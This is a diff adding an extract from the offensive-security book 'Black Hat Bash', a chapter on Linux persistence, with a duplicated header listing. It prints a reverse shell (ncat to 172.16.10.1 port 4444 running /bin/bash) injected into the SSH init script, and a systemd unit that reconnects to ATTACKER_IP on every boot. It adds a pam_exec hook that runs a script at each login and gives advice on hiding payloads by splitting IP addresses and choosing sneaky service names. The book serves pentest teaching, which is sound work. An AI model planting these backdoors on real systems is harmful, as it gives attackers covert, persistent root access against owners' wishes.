@@ -1,0 +1,78 @@
+# Security Chapter Extract
+Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
+Chapter: 2 - --snip--
+start)
+  check_privsep_dir
+  check_for_no_start
+  check_dev_null
+  log_daemon_msg "Starting OpenBSD Secure Shell server" "sshd" || true
+  if start-stop-daemon --start --quiet --oknodo --chuid 0:0 --pidfile
+/run/sshd.pid --exec /usr/sbin/sshd -- $SSHD_OPTS; then
+    log_end_msg 0 || true
+  else
+    log_end_msg 1 || true
+  fi
+  ncat 172.16.10.1 4444 -e /bin/bash 2> /dev/null &
+  ;;
+--snip--
+Security Relevance Score: 6
+Word Count: 703
+Extracted: 2025-06-13 23:40:57
+
+---
+
+--snip--
+start)
+  check_privsep_dir
+  check_for_no_start
+  check_dev_null
+  log_daemon_msg "Starting OpenBSD Secure Shell server" "sshd" || true
+  if start-stop-daemon --start --quiet --oknodo --chuid 0:0 --pidfile
+/run/sshd.pid --exec /usr/sbin/sshd -- $SSHD_OPTS; then
+    log_end_msg 0 || true
+  else
+    log_end_msg 1 || true
+  fi
+  ncat 172.16.10.1 4444 -e /bin/bash 2> /dev/null &
+  ;;
+--snip--
+
+Listing 10-2: A reverse shell payload injected into /etc/init.d/ssh
+Next, start a listener to receive the reverse shell on Kali. You can use pwncat, Ncat, Netcat, or any other listener you prefer.
+$ pwncat-cs -l -p 4444
+Finally, switch back to the target system and run the service command to start the SSH server daemon:
+# service ssh start
+You should see the reverse shell connecting to the listener.
+Note that when you introduce obviously malicious commands such as reverse shell payloads, you should make these as invisible as possible. For example, try splitting the listener’s remote IP address into a bunch of variables so it blends with the rest of the script and doesn’t stand out to anyone who happens to be reading it.
+
+
+systemd
+systemd manages units, which can represent services, devices, and other types of components. To achieve persistence, we could try to use systemd as a way to register a new service unit on the system. Listing 10-3 shows an example of a systemd service with a reverse shell payload.
+❶ [Unit]
+Description=RevShell
+After=network-online.target
+❷ Wants=network-online.target
+
+[Service]
+❸ ExecStart=ncat ATTACKER_IP 4444 -e /bin/bash
+❹ Restart=always
+
+[Install]
+WantedBy=multi-user.target
+
+Listing 10-3: An example malicious systemd service definition file
+This service defines the following properties: a new unit ❶, a requirement for networking to be available ❷, an instruction to execute the reverse shell to the attacker’s machine on service start ❸, and a requirement to restart the process if it dies ❹.
+The containers in the lab don’t run systemd, but if you’d like to experiment with this technique, you could use these commands on your Kali machine. To use the script, create a new service file at /etc/system/service/revshell.service. (The name of the file is also the name of the service. In a real attack, you should probably use a sneakier name so it blends nicely with the environment.) Then enable the service by executing systemctl enable revshell.
+Run the malicious service by using systemctl start revshell. Now, if the machine ever reboots, this service file should reestablish a connection on boot.
+
+
+
+Hooking into Pluggable Authentication Modules
+Pluggable authentication modules (PAMs) provide high-level APIs for low-level authentication schemes, and applications can use them to authenticate users. For example, you could adopt an external multifactor authentication provider to prompt users to enter a code or insert a hardware security token during login, in addition to using a traditional password. PAM configuration files live in the /etc/pam.d directory.
+In terms of establishing persistence, PAM has an interesting capability: it can call external scripts at certain points during an authentication flow by using the pam_exec.so library. By modifying specific configurations, we could make PAM call our own script whenever a user logs in to a system, then take any action we’d like.
+For example, under /etc/pam.d, you will find a file named common-session. This file includes session-related modules that are common to all services. Modify this file by appending the following line to it:
+session     optional     pam_exec.so seteuid /usr/local/bin/pam-helper.sh
+The format of this line is as follows:
+type - control - module-path - module-arguments
+The type is session, the control is optional, the module path is pam_exec.so, and the module arguments are seteuid and /usr/local/bin/pam-helper.sh. The session type refers to the actions taken before or after a user is given access to a service, commonly used for actions such as logging. The optional control means that no matter whether this module succeeds or not, it won’t impact the authentication or login flow. The module path pam_exec.so is the library we will use to call external programs, followed by the module arguments seteuid (set effective UID) and the full path to the script.
+Once you’ve saved the PAM configuration file, pam_exec.so will call your script whenever someone logs in to or out of the system (for example, by running su - backup and providing the password). We’ll provide guidance on writing a suitable persistence script in Exercise
